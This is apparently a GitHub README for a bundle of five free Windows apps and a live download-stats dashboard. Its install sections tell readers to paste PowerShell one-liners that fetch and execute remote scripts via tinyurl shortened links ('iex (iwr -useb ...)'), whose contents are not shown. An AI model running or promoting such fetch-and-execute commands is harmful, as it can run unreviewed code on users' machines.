# 5 Free Apps Bundle

<p align="center">
  <b>Live download dashboard</b> tracking 5 free open-source Windows apps. All badges fetch live data — no manual updates needed.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Projects-5-0db7ed?style=flat-square" alt="5 projects">
  <img src="https://img.shields.io/badge/Updated-Live%20API-ff4444?style=flat-square" alt="Live API">
</p>

---

<p align="center">
  <a href="https://eaeoz.github.io/5_Free_Apps_Bundle">
    <img src="https://img.shields.io/badge/⭐_Official_Website-5_Free_Apps_Bundle-ff4444?style=for-the-badge" alt="Official Website">
  </a>
</p>

---

## Tracked Projects

Each release ships two `.exe` variants — **Setup** (installer) and **Portable** (standalone). The **Downloads** badge shows the total across both.

> **How to run the install commands below:** Press `Win+R`, type `powershell`, press Enter, paste the command, press Enter.

---

## All-in-One Install

Run one command to install all 5 apps at once:

```powershell
"ytdlps1","movdlps1","msdlps1","cmmgrps1","sndkkps1" | ForEach-Object { iex (iwr -useb "https://tinyurl.com/$_") }
```

---

## 📦 Or Download Each Tool Individually

<table>
  <tr>
    <td width="180"><b>YouTube Downloader</b></td>
    <td>
      <code>iex (iwr -useb https://tinyurl.com/ytdlps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Movie Downloader</b></td>
    <td>
      <code>iex (iwr -useb https://tinyurl.com/movdlps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Music Downloader</b></td>
    <td>
      <code>iex (iwr -useb https://tinyurl.com/msdlps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Command Manager</b></td>
    <td>
      <code>iex (iwr -useb https://tinyurl.com/cmmgrps1)</code>
    </td>
  </tr>
  <tr>
    <td width="180"><b>Sondakika</b></td>
    <td>
      <code>iex (iwr -useb https://tinyurl.com/sndkkps1)</code>
    </td>
  </tr>
</table>

---

## Dashboard

Open [`index.html`](index.html) in any browser — no server required. The page fetches live data from:

```
https://raw.githubusercontent.com/eaeoz/app-stats/main/public/releases.json
```

Each repo card displays:

- Avatar & app icon
- **Total downloads** (Setup + Portable across all releases)
- **Release count** (number of unique tags with `.exe` assets)
- Star count from GitHub
- One-click install command
- Latest `.exe` assets — each row is a clickable download link showing file name, size, and per-asset download count
- **Older releases** collapsible section with the same info

## Editing

To add or modify repos, edit the `REPOS` array and `META` map in `index.html`. Each `META` entry requires a `label`, `icon` (SVG string), `accent` color, and `cmd` install command.
